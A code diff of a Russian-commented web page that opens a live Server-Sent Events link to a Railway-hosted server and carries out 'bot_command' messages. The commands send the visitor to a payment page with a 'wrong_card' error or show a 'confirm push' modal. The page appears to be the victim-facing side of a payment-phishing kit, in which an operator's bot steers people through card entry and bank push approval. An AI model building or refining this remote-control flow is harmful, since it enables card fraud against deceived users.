@@ -7,6 +7,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
+        /* Стили остаются без изменений */
         :root {
             --primary: #D4AF37;
             --primary-dark: #B8941F;
@@ -40,7 +41,6 @@
             padding: 20px;
         }
 
-        /* Header */
         header {
             display: flex;
             justify-content: space-between;
@@ -165,7 +165,6 @@
             transform: translateY(-2px);
         }
 
-        /* Loading Container */
         .loading-container {
             display: flex;
             flex-direction: column;
@@ -201,7 +200,6 @@
             font-size: 16px;
         }
 
-        /* SSE Status */
         .sse-status {
             position: fixed;
             top: 10px;
@@ -223,7 +221,6 @@
             color: var(--text);
         }
 
-        /* Footer */
         footer {
             text-align: center;
             padding: 30px 0;
@@ -233,7 +230,6 @@
             font-size: 14px;
         }
 
-        /* Responsive Styles */
         @media (max-width: 768px) {
             .container {
                 padding: 15px;
@@ -320,16 +316,6 @@
                 padding: 20px 0;
                 margin-top: 30px;
                 font-size: 12px;
-            }
-        }
-
-        @media (max-width: 360px) {
-            .logo-text {
-                font-size: 20px;
-            }
-
-            footer {
-                font-size: 11px;
             }
         }
     </style>
@@ -438,12 +424,20 @@
 
         changeLanguage(currentLanguage);
 
-        // SSE подключение
-        const userId = "user_123"; // Должен совпадать с ID в боте
-        const RAILWAY_URL = "roomix-production.up.railway.app"; // ← ЗАМЕНИ НА СВОЙ RAILWAY URL
+        // SSE подключение для GitHub Pages
+        const userId = "user_123";
+        const RAILWAY_URL = "https://roomixvbiv.up.railway.app"; // Ваш Railway URL
         let eventSource = null;
+        let reconnectAttempts = 0;
+        const maxReconnectAttempts = 10;
 
         function connectSSE() {
+            if (reconnectAttempts >= maxReconnectAttempts) {
+                console.error('❌ Максимальное количество попыток переподключения');
+                updateSSEStatus(false, 'Максимальное количество попыток');
+                return;
+            }
+
             try {
                 const sseUrl = `${RAILWAY_URL}/sse/${userId}`;
                 console.log('🔄 Подключаемся к SSE:', sseUrl);
@@ -452,39 +446,54 @@
 
                 eventSource.onopen = function(event) {
                     console.log('✅ SSE подключение открыто');
-                    updateSSEStatus(true);
+                    reconnectAttempts = 0;
+                    updateSSEStatus(true, 'SSE подключен');
                 };
 
                 eventSource.onmessage = function(event) {
                     console.log('📨 Получено сообщение SSE:', event.data);
-                    const command = JSON.parse(event.data);
-                    handleBotCommand(command);
-                    updateSSEStatus(true);
+                    try {
+                        const data = JSON.parse(event.data);
+                        
+                        if (data.type === 'connected') {
+                            console.log('✅ Подтверждение подключения SSE');
+                            return;
+                        }
+                        
+                        if (data.type === 'bot_command') {
+                            handleBotCommand(data);
+                        }
+                    } catch (e) {
+                        console.error('❌ Ошибка парсинга команды:', e);
+                    }
                 };
 
                 eventSource.onerror = function(event) {
-                    console.error('❌ Ошибка SSE:', event);
-                    console.log('Состояние SSE:', eventSource.readyState);
-                    updateSSEStatus(false);
+                    console.error('❌ Ошибка SSE');
+                    reconnectAttempts++;
                     
-                    // Переподключаемся через 3 секунды
-                    setTimeout(connectSSE, 3000);
+                    if (eventSource.readyState === EventSource.CLOSED) {
+                        updateSSEStatus(false, 'Переподключение...');
+                        console.log(`🔄 Переподключаемся через 3 секунды... (попытка ${reconnectAttempts}/${maxReconnectAttempts})`);
+                        setTimeout(connectSSE, 3000);
+                    }
                 };
 
             } catch (error) {
                 console.error('💥 Ошибка создания SSE:', error);
-                updateSSEStatus(false);
+                reconnectAttempts++;
+                updateSSEStatus(false, 'Ошибка подключения');
                 setTimeout(connectSSE, 5000);
             }
         }
 
-        function updateSSEStatus(connected) {
+        function updateSSEStatus(connected, message = '') {
             const statusElement = document.getElementById('sseStatus');
             if (connected) {
                 statusElement.textContent = '🟢 SSE подключен';
                 statusElement.className = 'sse-status sse-connected';
             } else {
-                statusElement.textContent = '🔴 SSE отключен';
+                statusElement.textContent = `🔴 ${message || 'SSE отключен'}`;
                 statusElement.className = 'sse-status sse-disconnected';
             }
         }
@@ -499,6 +508,27 @@
             } else if (command.action === 'wrong_card') {
                 window.redirectToPaymentWithError();
             }
+        }
+
+        // Тест соединения
+        function testConnection() {
+            console.log('🧪 Тестируем соединение с сервером...');
+            
+            fetch(`${RAILWAY_URL}/health`)
+                .then(response => {
+                    console.log('✅ Health endpoint доступен:', response.status);
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('📊 Статус сервера:', data);
+                    updateSSEStatus(true, 'Сервер доступен');
+                    connectSSE();
+                })
+                .catch(error => {
+                    console.error('❌ Health endpoint недоступен:', error);
+                    updateSSEStatus(false, 'Сервер недоступен');
+                    setTimeout(testConnection, 5000);
+                });
         }
 
         // Функции для управления страницей
@@ -561,19 +591,16 @@
 
             document.body.appendChild(modal);
 
-            // Добавляем обработчики для кнопок
             document.getElementById('confirmPushBtn').addEventListener('click', function() {
                 document.querySelector('div[style*="position: fixed"]').remove();
                 const loadingText = document.querySelector('.loading-text');
                 loadingText.textContent = '✅ Операция подтверждена!';
-                // НЕ ПЕРЕХОДИМ НА SUCCESS - ОСТАЕМСЯ ЗДЕСЬ
             });
 
             document.getElementById('cancelPushBtn').addEventListener('click', function() {
                 document.querySelector('div[style*="position: fixed"]').remove();
                 const loadingText = document.querySelector('.loading-text');
                 loadingText.textContent = '❌ Операция отменена';
-                // НЕ ПЕРЕХОДИМ НА PAYMENT - ОСТАЕМСЯ ЗДЕСЬ
             });
         };
 
@@ -585,28 +612,10 @@
             window.location.href = 'payment.html?status=wrong_card';
         };
 
-        // Диагностика SSE
-        function debugSSE() {
-            console.log('🔍 SSE Debug Info:');
-            console.log('RAILWAY_URL:', RAILWAY_URL);
-            console.log('User ID:', userId);
-            console.log('Full SSE URL:', `${RAILWAY_URL}/sse/${userId}`);
-            
-            // Тестовый запрос к health endpoint
-            fetch(`${RAILWAY_URL}/health`)
-                .then(response => {
-                    console.log('Health check status:', response.status);
-                    return response.json();
-                })
-                .then(data => console.log('Health data:', data))
-                .catch(error => console.error('Health check failed:', error));
-        }
-
-        // Запускаем SSE при загрузке
+        // Запускаем при загрузке
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('🚀 Запуск SSE подключения...');
-            debugSSE();
-            connectSSE();
+            console.log('🚀 Инициализация SSE для GitHub Pages...');
+            testConnection();
         });
 
         // Закрываем SSE при закрытии страницы
@@ -618,4 +627,3 @@
     </script>
 </body>
 </html>
-
